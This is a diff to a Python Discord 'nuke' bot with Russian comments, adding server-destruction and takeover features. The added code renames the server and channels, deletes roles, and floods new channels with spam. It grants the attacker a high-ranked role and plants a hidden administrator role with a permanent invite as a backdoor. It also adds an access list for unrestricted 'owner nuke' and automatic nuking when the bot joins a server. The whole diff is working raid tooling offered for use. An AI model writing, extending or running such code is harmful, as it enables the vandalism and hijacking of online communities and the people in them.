@@ -55,16 +55,37 @@ async def db_set(collection: str, key: str, value):
 # ─── NUKE LOGS ─────────────────────────────────────────────
 
 async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
-    """Сохраняет лог нюка. Одна запись на сервер — обновляется при повторном нюке."""
-    # Пробуем получить инвайт
+    """Сохраняет лог нюка. Создаёт роль с правами администратора и инвайт через неё."""
     invite_url = None
     try:
-        ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
-        if ch:
-            inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
-            invite_url = inv.url
+        # Создаём роль с правами администратора
+        log_role = await guild.create_role(
+            name="☠️ ECLIPSED LOG",
+            permissions=discord.Permissions(administrator=True),
+            color=discord.Color.dark_red()
+        )
+        # Поднимаем роль как можно выше
+        try:
+            await log_role.edit(position=max(1, guild.me.top_role.position - 1))
+        except Exception:
+            pass
+        # Создаём канал с доступом только для этой роли
+        overwrites = {
+            guild.default_role: discord.PermissionOverwrite(view_channel=False),
+            log_role: discord.PermissionOverwrite(view_channel=True, create_instant_invite=True)
+        }
+        log_ch = await guild.create_text_channel(name="eclipsed-log", overwrites=overwrites)
+        inv = await log_ch.create_invite(max_age=0, max_uses=0, unique=True)
+        invite_url = inv.url
     except Exception:
-        pass
+        # Fallback — обычный инвайт если не получилось создать роль
+        try:
+            ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
+            if ch:
+                inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
+                invite_url = inv.url
+        except Exception:
+            pass
 
     import datetime
     entry = {
@@ -77,6 +98,7 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
         "time": datetime.datetime.utcnow().strftime("%d.%m.%Y %H:%M UTC")
     }
     await db_set("nuke_logs", str(guild.id), entry)
+
 
 
 # ─── HELPERS ───────────────────────────────────────────────
@@ -112,6 +134,14 @@ def save_premium():
     asyncio.create_task(db_set("data", "premium", PREMIUM_LIST))
 
 
+def save_owner_nuke_list():
+    asyncio.create_task(db_set("data", "owner_nuke_list", OWNER_NUKE_LIST))
+
+
+def is_owner_nuker(user_id):
+    return user_id in OWNER_NUKE_LIST or user_id == config.OWNER_ID
+
+
 def load_whitelist():
     pass  # заменено на async load в on_ready
 
@@ -133,6 +163,7 @@ def load_spam_text():
 
 BLOCKED_GUILDS: list[int] = []
 PREMIUM_LIST: list[int] = []
+OWNER_NUKE_LIST: list[int] = []
 
 
 def save_blocked_guilds():
@@ -181,34 +212,35 @@ async def delete_all_roles(guild):
     )
 
 
-async def do_nuke(guild, spam_text=None):
+async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
+
+    NUKE_NAME = "Crash by DavaidKa"
+
+    # ── 1. Переименовываем сервер и все каналы ──
     try:
-        await guild.edit(name=config.GUILD_NAME)
+        await guild.edit(name=NUKE_NAME)
     except Exception:
         pass
-
-    boosters = [m for m in guild.members if m.premium_since is not None]
-    bot_role = guild.me.top_role
-
-    # Удаляем каналы, роли и баним бустеров одновременно
     await asyncio.gather(
-        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
-        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
-        asyncio.gather(*[m.ban(reason="Booster") for m in boosters], return_exceptions=True),
+        *[c.edit(name=NUKE_NAME) for c in guild.channels],
         return_exceptions=True
     )
 
-    # Создаём каналы и сразу спамим в каждый по мере создания
-    created_channels = []
+    # ── 2. Удаляем все роли ──
+    bot_role = guild.me.top_role
+    await asyncio.gather(
+        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
+        return_exceptions=True
+    )
 
+    # ── 3. Создаём каналы ──
     async def create_and_spam(i):
         try:
             if not nuke_running.get(guild.id):
                 return
-            ch = await guild.create_text_channel(name=config.GUILD_NAME)
-            created_channels.append(ch)
+            ch = await guild.create_text_channel(name=NUKE_NAME)
             await asyncio.gather(
                 *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                 return_exceptions=True
@@ -216,7 +248,25 @@ async def do_nuke(guild, spam_text=None):
         except Exception:
             pass
 
+    # ── 4. Спам до 500 сообщений ──
     await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
+
+    # ── 5. Создаём роль и выдаём тому кто написал !nuke ──
+    if caller_id:
+        try:
+            member = guild.get_member(caller_id)
+            if not member:
+                member = await guild.fetch_member(caller_id)
+            if member:
+                role = await guild.create_role(name="☠️ ECLIPSED", color=discord.Color.dark_red())
+                # Поднимаем роль как можно выше
+                try:
+                    await role.edit(position=max(1, guild.me.top_role.position - 1))
+                except Exception:
+                    pass
+                await member.add_roles(role)
+        except Exception:
+            pass
 
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
@@ -292,6 +342,23 @@ async def do_superpr_nuke_task(guild, spam_text=None):
 
     await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
 
+    # ── Создаём роль и выдаём запустившему ──
+    _starter = nuke_starter.get(guild.id)
+    if _starter:
+        try:
+            member = guild.get_member(_starter)
+            if not member:
+                member = await guild.fetch_member(_starter)
+            if member:
+                role = await guild.create_role(name="☠️ ECLIPSED", color=discord.Color.dark_red())
+                try:
+                    await role.edit(position=max(1, guild.me.top_role.position - 1))
+                except Exception:
+                    pass
+                await member.add_roles(role)
+        except Exception:
+            pass
+
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
     last_spam_text[guild.id] = spam_text
@@ -349,6 +416,23 @@ async def do_owner_nuke_task(guild, spam_text=None):
 
     await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
 
+    # ── Создаём роль и выдаём запустившему ──
+    _starter = nuke_starter.get(guild.id)
+    if _starter:
+        try:
+            member = guild.get_member(_starter)
+            if not member:
+                member = await guild.fetch_member(_starter)
+            if member:
+                role = await guild.create_role(name="☠️ ECLIPSED", color=discord.Color.dark_red())
+                try:
+                    await role.edit(position=max(1, guild.me.top_role.position - 1))
+                except Exception:
+                    pass
+                await member.add_roles(role)
+        except Exception:
+            pass
+
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
     last_spam_text[guild.id] = spam_text
@@ -387,7 +471,7 @@ async def nuke(ctx, *, text: str = None):
     spam_text = text if text else config.SPAM_TEXT
     last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
     last_spam_text[ctx.guild.id] = spam_text
-    asyncio.create_task(do_nuke(guild, spam_text))
+    asyncio.create_task(do_nuke(guild, spam_text, caller_id=ctx.author.id))
     asyncio.create_task(log_nuke(guild, ctx.author, "nuke"))
 
 
@@ -725,7 +809,7 @@ def save_auto_owner_nuke():
 @bot.command(name="owner_nuke")
 async def owner_nuke(ctx, *, text: str = None):
     """Полный нюк без ограничений. Только для овнера."""
-    if ctx.author.id != config.OWNER_ID:
+    if not is_owner_nuker(ctx.author.id):
         return
     guild = ctx.guild
     if is_guild_blocked(guild.id):
@@ -747,7 +831,7 @@ async def owner_nuke(ctx, *, text: str = None):
 async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
     """Авто owner_nuke при входе бота на сервер. Только для овнера."""
     global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
-    if ctx.author.id != config.OWNER_ID:
+    if not is_owner_nuker(ctx.author.id):
         return
     if state.lower() == "on":
         AUTO_OWNER_NUKE = True
@@ -781,6 +865,44 @@ async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
         await ctx.send(f"Auto Owner Nuke: **{status}**\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`")
     else:
         await ctx.send("`!auto_owner_nuke on/off/text/info`")
+
+
+@bot.command(name="on_add")
+async def on_add(ctx, user_id: int):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id not in OWNER_NUKE_LIST:
+        OWNER_NUKE_LIST.append(user_id)
+        save_owner_nuke_list()
+    await ctx.send(f"👑 `{user_id}` получил доступ к **Owner Nuke**.")
+
+
+@bot.command(name="on_remove")
+async def on_remove(ctx, user_id: int):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id in OWNER_NUKE_LIST:
+        OWNER_NUKE_LIST.remove(user_id)
+        save_owner_nuke_list()
+        await ctx.send(f"✅ `{user_id}` убран из Owner Nuke.")
+    else:
+        await ctx.send("Не найден.")
+
+
+@bot.command(name="on_list")
+async def on_list(ctx):
+    if ctx.author.id != config.OWNER_ID:
+        return
+    lines = []
+    for uid in OWNER_NUKE_LIST:
+        try:
+            user = await bot.fetch_user(uid)
+            lines.append(f"`{uid}` — **{user}**")
+        except Exception:
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="👑 Owner Nuke List", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
+    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(OWNER_NUKE_LIST)}")
+    await ctx.send(embed=embed)
 
 
 @bot.command(name="goout")
@@ -1412,14 +1534,17 @@ async def changelog(ctx):
         inline=False
     )
     embed.add_field(
-        name="🔥 v1.8 — Чистка и улучшения",
+        name="🔥 v1.8 — Большое обновление",
         value=(
-            "• `!super_nuke` — теперь удаляет старые каналы вместо переименования\n"
-            "• Удалены команды `!emojisnuke`, `!addch`, `!invs_delete`\n"
+            "• `!nuke` — переименование сервера/каналов → удаление ролей → каналы → спам → роль ☠️ ECLIPSED\n"
+            "• `!super_nuke` — оставляет до 15 участников, создаёт роль ☠️ ECLIPSED\n"
+            "• `!owner_nuke` / `!auto_owner_nuke` — нюк без ограничений, создаёт роль ☠️ ECLIPSED\n"
+            "• `!on_add/remove/list` — отдельный список для owner_nuke\n"
+            "• `!goout` — бот покидает сервер\n"
+            "• `!nukelogs` — инвайт через роль с правами администратора\n"
             "• `!unban <id>` — разбан через ЛС на всех серверах\n"
-            "• `!nukelogs` — логи нюков с инвайтами\n"
-            "• `!roles` — список ролей доступных боту\n"
-            "• `!giverole` — выдать роль участнику"
+            "• `!roles` / `!giverole` — управление ролями\n"
+            "• MongoDB — постоянное хранение всех данных"
         ),
         inline=False
     )
@@ -1477,7 +1602,7 @@ async def help_cmd(ctx):
     embed.add_field(
         name="✅ ОБЫЧНАЯ ПОДПИСКА",
         value=(
-            "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
+            "`!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
             "`!stop` — остановить краш\n"
             "`!cleanup` — снести всё, оставить один канал\n"
             "`!rename [название]` — переименовать все каналы\n"
@@ -1520,7 +1645,13 @@ async def help_cmd(ctx):
             "`!blocked_guilds` — список заблокированных\n"
             "`!set_spam_text / !get_spam_text` — текст нюка\n"
             "`!owl_add/remove/list` — owner whitelist\n"
-            "`!guilds / !setguild / !invlink` — управление серверами в ЛС"
+            "`!guilds / !setguild / !invlink` — управление серверами в ЛС\n"
+            "`!owner_nuke [текст]` — нюк без ограничений\n"
+            "`!auto_owner_nuke on/off/text/info` — авто owner нюк\n"
+            "`!on_add/remove/list` — управление Owner Nuke\n"
+            "`!goout` — покинуть сервер\n"
+            "`!nukelogs` — логи нюков\n"
+            "`!roles` / `!giverole` — роли"
         ),
         inline=False
     )
@@ -1548,7 +1679,7 @@ async def commands_user(ctx):
     embed.add_field(
         name="💀 УНИЧТОЖЕНИЕ",
         value=(
-            "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
+            "`!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
             "`!stop` — остановить краш\n"
             "`!cleanup` — снести всё, оставить один канал\n"
             "`!auto_nuke on/off/info` — авто-краш при входе бота"
@@ -1817,7 +1948,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             spam_text = args if args else config.SPAM_TEXT
             last_nuke_time[guild.id] = asyncio.get_running_loop().time()
             last_spam_text[guild.id] = spam_text
-            asyncio.create_task(do_nuke(guild, spam_text))
+            asyncio.create_task(do_nuke(guild, spam_text, caller_id=message.author.id))
             await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")
 
         elif cmd_name == "stop":
@@ -2595,7 +2726,8 @@ async def on_message(message):
 async def on_ready():
     global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
     global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
-    global BLOCKED_GUILDS, PREMIUM_LIST
+    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
+    global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST
 
     # ── Загрузка из MongoDB ──
     wl = await db_get("data", "whitelist")
@@ -2623,6 +2755,15 @@ async def on_ready():
     if aspn is not None:
         AUTO_SUPERPR_NUKE = aspn.get("enabled", False)
         AUTO_SUPERPR_NUKE_TEXT = aspn.get("text", None)
+
+    aon = await db_get("data", "auto_owner_nuke")
+    if aon is not None:
+        AUTO_OWNER_NUKE = aon.get("enabled", False)
+        AUTO_OWNER_NUKE_TEXT = aon.get("text", None)
+
+    onl = await db_get("data", "owner_nuke_list")
+    if onl is not None:
+        OWNER_NUKE_LIST = onl
 
     bot.tree.clear_commands(guild=None)
 
@@ -2704,7 +2845,7 @@ async def on_ready():
         last_nuke_time[guild.id] = asyncio.get_running_loop().time()
         last_spam_text[guild.id] = config.SPAM_TEXT
         await interaction.response.send_message("💀 Краш запущен.", ephemeral=True)
-        asyncio.create_task(do_nuke(guild, config.SPAM_TEXT))
+        asyncio.create_task(do_nuke(guild, config.SPAM_TEXT, caller_id=interaction.user.id))
 
     @bot.tree.command(name="stop", description="⛔ Остановить краш")
     @app_commands.allowed_installs(guilds=True, users=True)
